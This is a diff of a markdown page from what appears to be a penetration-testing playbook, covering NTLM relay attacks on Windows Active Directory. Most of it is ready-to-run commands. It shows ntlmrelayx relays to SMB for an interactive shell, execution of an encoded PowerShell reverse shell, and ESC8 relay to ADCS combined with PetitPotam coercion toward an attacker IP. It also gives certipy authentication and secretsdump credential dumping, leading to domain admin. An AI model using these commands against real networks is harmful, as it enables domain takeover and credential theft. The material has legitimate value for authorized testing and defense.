@@ -3,46 +3,63 @@ id: ntlm-relay
 title: NTLM Relay
 stage: initial-access
 tags: [windows, ad, smb]
-tools:
-  - impacket-ntlmrelayx -tf targets.txt -smb2support
-  - impacket-ntlmrelayx -tf targets.txt -smb2support -i
-  - impacket-ntlmrelayx -t http://$DC_IP/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+summary: Intercept and relay NTLM authentication to a target you control — SMB signing disabled is the prerequisite, and relaying to ADCS can yield a domain admin certificate.
 leads_to:
   - rev-shell
   - pass-the-hash
   - domain-admin
 ---
 
-## Relay to SMB
+## Prerequisites
+
+SMB signing disabled on at least one target (verify with `nxc smb $CIDR --gen-relay-list`). Must be on the same network segment to capture authentications, or use coercion to force auth from a specific machine.
+
+NTLM relay intercepts an authentication challenge from one machine and forwards it to another, tricking the second machine into thinking the first has authenticated. The most powerful use is relaying to ADCS Web Enrollment (ESC8) — you relay a DC's authentication and get a certificate that lets you impersonate the DC, leading directly to domain admin via DCSync.
+
+## Quick Win
+
+> Generate the relay target list — if this is empty, relay isn't viable, switch to capture.
 
 ```bash
-# Interactive shell
-impacket-ntlmrelayx -tf targets.txt -smb2support -i
-nc 127.0.0.1 11000   # connect to the interactive shell
+nxc smb 192.168.x.0/24 --gen-relay-list targets.txt
+```
 
-# Execute command directly
+## Relay to SMB (Shell or Dump)
+
+> Relayed user's credential is used against the target — if they're local admin, you get a shell.
+
+```bash
+# Interactive SMB shell
+impacket-ntlmrelayx -tf targets.txt -smb2support -i
+nc 127.0.0.1 11000   # connect to the spawned shell
+
+# Direct command execution
 impacket-ntlmrelayx -tf targets.txt -smb2support -c "powershell -enc <base64_reverse_shell>"
 ```
 
-## Relay to ADCS (ESC8)
+## Relay to ADCS (ESC8) — DC Certificate
+
+> Relay a DC's machine account auth to ADCS → get a DC certificate → DCSync without DA.
 
 ```bash
-# Requires: Web Enrollment enabled on CA
-impacket-ntlmrelayx -t http://$DC_IP/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
-# Then coerce DC auth:
+# Step 1: Set up relay to ADCS Web Enrollment
+impacket-ntlmrelayx -t http://$CA_SERVER/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+
+# Step 2: Coerce DC authentication to your listener
 python3 PetitPotam.py $ATTACKER_IP $DC_IP
 
-# Convert cert → NT hash
+# Step 3: Convert certificate to NT hash
 certipy auth -pfx dc.pfx -dc-ip $DC_IP
 ```
 
 ## After Relay Success
 
+> Relayed user is local admin → dump immediately before the session expires.
+
 ```bash
-# If relayed user is local admin → dump immediately
 impacket-secretsdump $DOMAIN/user@$TARGET -hashes :NTLM_HASH
 ```
 
-## Notes
+## Leads To
 
-Relay hits give you the credentials of whatever user's traffic you intercepted. If that's a domain admin or local admin — dump and move. Combine with coercion (PetitPotam/PrinterBug) to force specific machine accounts to authenticate.
+Local admin relay on a workstation → dump SAM hashes → pass-the-hash across the subnet. ADCS ESC8 relay → DC certificate → certipy auth → NT hash of DC machine account → DCSync → domain-admin. Relay to multiple targets simultaneously with ntlmrelayx's default multi-target mode.
